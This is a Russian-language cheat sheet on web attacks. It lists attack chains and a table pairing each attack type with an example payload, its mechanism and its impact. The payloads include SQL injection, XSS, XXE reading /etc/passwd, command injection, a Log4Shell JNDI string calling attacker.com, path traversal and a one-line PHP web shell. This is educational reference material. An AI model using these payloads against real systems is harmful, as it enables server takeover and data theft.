# **Связь атак**

- **SQLi → RCE** (через xp_cmdshell или загрузку шелла).
- **XSS → кража сессий → админ-доступ.**
- **SSRF → доступ к AWS metadata → полный захват.**
- **XXE/LFI → утечка конфигов → учетные данные → RCE.**

# Таблица по веб-атакам
| **Атака (RU / EN)**                                                        | **Пример полезной нагрузки**                                                       | **Суть (как работает)**                                  | **Возможный результат**                                  |
| -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | -------------------------------------------------------- | -------------------------------------------------------- |
| **SQL-инъекция / SQL Injection (SQLi)**                                    | ' OR '1'='1 --                                                                     | Ввод изменяет SQL-запрос, выполняется чужой код в БД     | Обход авторизации, кража/изменение данных, иногда RCE    |
| **Межсайтовый скриптинг / Cross-Site Scripting (XSS)**                     | <script>alert('XSS')</script>                                                      | JS внедряется в страницу и выполняется в браузере жертвы | Кража cookies, сессий, фишинг, deface сайта              |
| **Внедрение внешних сущностей / XML External Entity (XXE)**                | xml <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data>&xxe;</data> | XML-парсер подставляет внешние ресурсы                   | Чтение файлов, SSRF, DoS                                 |
| **Инъекция в шаблон / Server-Side Template Injection (SSTI)**              | {{7*7}} (Jinja2)                                                                   | Код в шаблоне интерпретируется сервером                  | Выполнение кода (RCE)                                    |
| **Инъекция команд / Command Injection (CMDi)**                             | 127.0.0.1; cat /etc/passwd                                                         | Ввод подставляется в командную строку                    | Выполнение произвольных команд, полный доступ            |
| **Log4Shell (Log4j RCE)**                                                  | ${jndi:ldap://attacker.com/a}                                                      | Log4j обрабатывает JNDI-запрос → загрузка объекта        | RCE на сервере, полный захват                            |
| **Подделка серверных запросов / Server-Side Request Forgery (SSRF)**       | http://localhost/admin                                                             | Сервер делает запрос по переданному URL                  | Доступ к внутренним сервисам, утечка облачных метаданных |
| **Подключение локальных файлов / Local File Inclusion (LFI)**              | ?file=../../../../etc/passwd                                                       | Приложение подключает локальные файлы                    | Чтение конфигов, утечка данных, иногда RCE               |
| **Удалённое выполнение кода / Remote Code Execution (RCE)** + **WebShell** | shell.php: <?php system($_GET['cmd']); ?>                                          | Загрузка и запуск вредоносного скрипта                   | Полный контроль над сервером                             |
